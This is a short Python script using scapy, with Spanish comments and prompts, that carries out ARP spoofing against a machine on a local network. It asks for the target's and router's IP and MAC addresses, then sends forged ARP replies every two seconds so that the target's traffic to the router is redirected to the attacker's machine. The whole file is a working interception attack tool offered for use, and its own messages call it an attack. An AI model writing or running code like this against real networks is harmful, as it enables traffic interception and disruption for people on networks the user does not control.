from scapy.all import ARP, send
import threading

def arp_spoof(target_ip, spoof_ip, target_mac, spoof_mac):
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(arp_response, verbose=0)
    # Reprogramar la llamada a esta función después de 2 segundos
    threading.Timer(2.0, arp_spoof, args=[target_ip, spoof_ip, target_mac, spoof_mac]).start()

def main():
    target_ip = input("Ingrese la dirección IP de la máquina a atacar: ")
    spoof_ip = input("Ingrese la dirección IP del router: ")
    target_mac = input("Ingrese la dirección MAC de la máquina a atacar: ")
    spoof_mac = input("Ingrese la dirección MAC que desea usar para el spoofing (normalmente la de su máquina): ")

    print(f"Iniciando ARP spoofing hacia {target_ip} redirigiéndolo a {spoof_ip}")
    arp_spoof(target_ip, spoof_ip, target_mac, spoof_mac)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Interrumpido por el usuario. Terminando el ataque.")
